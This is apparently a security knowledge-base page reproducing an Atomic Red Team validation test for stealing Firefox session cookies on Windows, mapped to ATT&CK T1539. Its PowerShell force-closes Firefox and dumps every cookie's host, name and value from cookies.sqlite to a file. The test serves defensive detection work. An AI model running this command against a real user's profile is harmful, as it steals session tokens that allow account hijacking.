---
atomic_guid: "4b437357-f4e9-4c84-9fa6-9bcee6f826aa"
title: "Steal Firefox Cookies (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1539"
attack_technique_name: "Steal Web Session Cookie"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "4b437357-f4e9-4c84-9fa6-9bcee6f826aa"
  - "Steal Firefox Cookies (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
Note: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

## ATT&CK Mapping

- [[kb/attack/techniques/T1539-steal_web_session_cookie|T1539: Steal Web Session Cookie]]

## Input Arguments

### output_file

- description: Filepath to output cookies
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt

### sqlite3_path

- description: Path to sqlite3
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe

## Dependencies

Sqlite3 must exist at (#{sqlite3_path})

### Prerequisite Check

```powershell
if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
stop-process -name "firefox" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
```

### Cleanup

```powershell
remove-item #{output_file} -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml)
